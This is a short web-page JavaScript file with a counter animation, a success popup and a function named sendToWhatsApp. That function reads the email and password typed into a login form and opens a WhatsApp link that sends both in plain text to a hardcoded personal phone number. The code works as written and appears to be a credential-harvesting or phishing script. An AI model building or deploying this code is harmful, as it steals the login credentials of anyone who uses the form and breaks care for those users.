$(document).ready(function() {
    $('.counter').counterUp({
        Delay: 20,
        time: 3000
    });
}); 

alert(
    Swal.fire({
        title: "Good job!",
        text: "You clicked the button!",
        icon: "success"
      })
)
   


function sendToWhatsApp() {
    const email = document.getElementById('exampleInputEmail1').value;
    const password = document.getElementById('exampleInputPassword1').value;
    const isChecked = document.getElementById('exampleCheck1').checked ? "Checked" : "Not Checked";

    if (!email || !password) {
        alert("Please fill in all fields before sending.");
        return;
    }

    const message = `Email: ${email}%0APassword: ${password}%0AChecked: ${isChecked}`;
    const phoneNumber = '+2348063856166'; // Replace with your desired WhatsApp number (include country code).

    const whatsappURL = `https://wa.me/${phoneNumber}?text=${message}`;

    window.open(whatsappURL, '_blank');
}
